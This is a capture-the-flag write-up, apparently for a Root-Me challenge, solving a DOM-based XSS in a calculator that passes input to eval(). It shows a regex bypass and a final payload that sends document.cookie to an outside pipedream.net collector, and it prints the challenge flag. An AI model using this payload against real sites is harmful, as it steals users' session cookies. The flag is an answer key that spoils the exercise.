# XSS DOM Based - Eval

In this chall, you will be provided with a calculator that can add, substract, multiply and divide. There is only one input field so we will attack on that.

![anh1]()

Enter a string and this is what you'll get.

![anh2]()

If you look carefully, the regex is not very hard to bypass. Just input an expression at the start of the input, after that we can do anything we want.

Now I wil tell you how to solve this challenge. The `eval()` function can execute one or more commands in only one call like this:
`eval(<expression1>,<expression2>,<expression3>)`. For example, if you use `eval(alert(1),alert(2))`, you will get 2 popup alert box. So we will leverage this and solve this challenge. The payload to exploit this challenge will be like `1+1,<your payload>`. We use `1+1` to bypass the regex, after that we will use `,` to pass another parameter to the `eval()` function, that is our payload. However, if you use alert(), you will get this:

![anh3]()

The `()` is filtered, so I used `document.location` to XSS, and It's success! The payload I used to solved this challenge is  

```javascript

1+1,document.location="https://eo3f8xwoiu4uj8s.m.pipedream.net/?"+document.cookie

```

Wait for a short time and the flag is arrived :D

![anh4]()

Flag is `rootme{Eval_Is_DangER0us}`